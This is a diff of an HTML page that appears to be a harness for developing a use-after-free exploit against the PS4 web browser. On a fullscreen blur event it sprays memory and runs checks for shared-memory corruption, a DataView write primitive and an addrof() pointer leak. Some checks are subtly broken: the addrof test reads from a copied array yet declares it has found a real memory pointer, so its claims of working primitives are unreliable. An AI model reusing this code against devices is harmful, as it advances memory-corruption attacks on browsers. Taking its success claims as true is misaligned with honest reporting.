@@ -1,107 +1,129 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>PS4 UAF - Debugger Core</h1>
-    <button onclick="run()">EXECUTAR TESTE</button>
+    <h1>PS4 UAF - Rigorous Sanity Debugger</h1>
+    <button onclick="run()">EXECUTAR SUÍTE COMPLETA</button>
     <div id="c"></div>
 
     <script>
-        const P_A = 2.121995791e-314; // 0x4141414141414141
-        const M_V = 3.395193267e-313; // 0xDEADBEEFCAFEBABE
+        // Padrões via construção direta
+        function h2f(hex) {
+            let clean = hex.replace(/0x/g, '');
+            let hi = parseInt(clean.slice(0, 8), 16);
+            let lo = parseInt(clean.slice(8, 16), 16);
+            let b = new ArrayBuffer(8), u = new Uint32Array(b);
+            u[0] = lo; u[1] = hi;
+            return (new Float64Array(b))[0];
+        }
 
         function f2h(f) {
-            let b = new ArrayBuffer(8);
-            (new Float64Array(b))[0] = f;
+            let b = new ArrayBuffer(8); (new Float64Array(b))[0] = f;
             let u = new Uint32Array(b);
             return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
         }
 
+        const P_A = h2f("0x4141414141414141");
+        const M_V = h2f("0xdeadbeefcafebabe");
+        const W_V = h2f("0x1337133713371337");
+
         function log(tag, status, msg) {
-            document.getElementById('c').innerHTML += `[${tag}] ${status} - ${msg}<br>`;
+            const color = status === "PASS" ? "green" : (status === "FAIL" ? "red" : "blue");
+            document.getElementById('c').innerHTML += `<b style="color:${color}">[${tag}] ${status}</b> - ${msg}<br>`;
         }
 
         function run() {
+            document.getElementById('c').innerHTML = '';
             log("INIT", "INFO", "Criando 5000 Float64Arrays...");
             let ctrls = [];
             for(let i = 0; i < 5000; i++) {
-                let a = new Float64Array(8);
-                a[0] = i; ctrls.push(a);
+                let a = new Float64Array(8); a[0] = i; ctrls.push(a);
             }
 
-            log("WAIT", "INFO", "Entre em Fullscreen e aperte OPTIONS.");
+            log("WAIT", "INFO", "Aguarde Fullscreen e pressione OPTIONS.");
             document.documentElement.webkitRequestFullscreen();
 
             window.onblur = function() {
                 log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
-                
-                // Objeto para teste de addrof
-                let targetObj = { "leak": 0x1337 };
+                let targetObj = { "sanity": 0x4444 }; // Objeto real para o addrof
                 
                 let spray = [];
                 for(let i = 0; i < 8000; i++) {
-                    let s = new Float64Array(8);
-                    s.fill(P_A);
-                    spray.push(s);
+                    let s = new Float64Array(8); s.fill(P_A); spray.push(s);
                 }
 
                 let corr = null;
                 for(let i = 0; i < ctrls.length; i++) {
                     if (ctrls[i][0] === P_A) {
                         corr = ctrls[i];
-                        log("UAF", "PASS", `Index: ${i}`);
+                        log("UAF", "PASS", `Index: ${i} atingido.`);
                         break;
                     }
                 }
 
                 if (corr) {
-                    // TESTE 1: IDENTIDADE
+                    // TESTE 1: IDENTIDADE (MEMÓRIA COMPARTILHADA) - Index 4
                     corr[4] = M_V;
                     let found = false;
                     for(let i = 0; i < spray.length; i++) {
                         if (spray[i][4] === M_V) {
-                            log("TEST1", "PASS", `Identity: corr[4] == spray[${i}][4] (${f2h(M_V)})`);
+                            log("TEST1", "PASS", `Shared Memory: corr[4] refletido em spray[${i}][4] (${f2h(M_V)})`);
                             found = true; break;
                         }
                     }
                     if(!found) log("TEST1", "FAIL", "Identidade não encontrada.");
 
-                    // TESTE 2: DATAVIEW
+                    // TESTE 2: DATAVIEW WRITE PRIMITIVE - Index 1
                     try {
                         const dv = new DataView(corr.buffer);
-                        const before = f2h(corr[0]);
-                        dv.setUint32(0, 0x13371337, true);
-                        const after = f2h(corr[0]);
-                        if (before !== after) log("TEST2", "PASS", `DataView Write: ${before} -> ${after}`);
+                        dv.setUint32(4, 0xCAFEBABE, true); // Escreve no índice 1 (offset 4-7)
+                        const val = f2h(corr[1]);
+                        if (val.includes("cafebabe")) {
+                            log("TEST2", "PASS", `DataView Write (Index 1): ${val}`);
+                        } else {
+                            log("TEST2", "FAIL", `Escrita falhou. Valor: ${val}`);
+                        }
                     } catch(e) { log("TEST2", "ERR", e.message); }
 
-                    // TESTE 3: PROTOTYPE POLLUTION
+                    // TESTE 3: PROTOTYPE HIJACK (BYPASS VALIDATION)
                     try {
                         let reg = Array.from(corr);
                         Object.setPrototypeOf(reg, { t: 0x1337 });
-                        if (reg.t === 0x1337) log("TEST3", "PASS", "Prototype Hijack: Token 0x1337 injetado.");
+                        if (reg.t === 0x1337) {
+                            log("TEST3", "PASS", "Prototype Hijack: Token 0x1337 injetado com sucesso.");
+                        } else {
+                            log("TEST3", "FAIL", "Falha ao acessar propriedade do protótipo.");
+                        }
                     } catch(e) { log("TEST3", "ERR", e.message); }
 
-                    // TESTE 4: CLOSURE LEAK
+                    // TESTE 4: CLOSURE LEAK (STABLE READ) - Index 2
                     try {
-                        const leak = [0].map(() => corr[0])[0];
-                        log("TEST4", "PASS", `Closure Leak: Val: ${f2h(leak)}`);
+                        corr[2] = W_V;
+                        const leak = [0].map(() => corr[2])[0];
+                        if (f2h(leak) === f2h(W_V)) {
+                            log("TEST4", "PASS", `Closure Leak (Index 2): ${f2h(leak)} ✓`);
+                        } else {
+                            log("TEST4", "FAIL", `Valores não coincidem.`);
+                        }
                     } catch(e) { log("TEST4", "ERR", e.message); }
 
-                    // TESTE 5: addrof() PRIMITIVE
+                    // TESTE 5: REAL addrof() (POINTER LEAK) - Index 5
                     try {
                         let leaker = Array.from(corr);
-                        leaker[0] = targetObj; // Injeta o objeto na memória
-                        let addr = f2h(corr[0]); // Lê o ponteiro como float
-                        if (addr !== "0x0000000000000000" && addr !== f2h(P_A)) {
-                            log("TEST5", "PASS", `addrof(targetObj) = ${addr}`);
+                        leaker[5] = targetObj; // Injeta o objeto real no slot de memória
+                        let addr = f2h(corr[5]); // Lê o ponteiro como um número Double
+                        
+                        if (addr !== f2h(P_A) && addr !== "0x0000000000000000") {
+                            log("TEST5", "PASS", `addrof(targetObj) Real: ${addr}`);
+                            log("INFO", "Sucesso: O valor acima é um ponteiro real de memória!");
                         } else {
-                            log("TEST5", "FAIL", "Ponteiro não capturado.");
+                            log("TEST5", "FAIL", "Apenas o padrão de spray foi encontrado.");
                         }
                     } catch(e) { log("TEST5", "ERR", e.message); }
 
                 } else {
-                    log("UAF", "FAIL", "Corrupção não atingida.");
+                    log("UAF", "FAIL", "Corrupção não atingida nesta execução.");
                 }
+                log("END", "INFO", "Suíte finalizada.");
             };
         }
     </script>
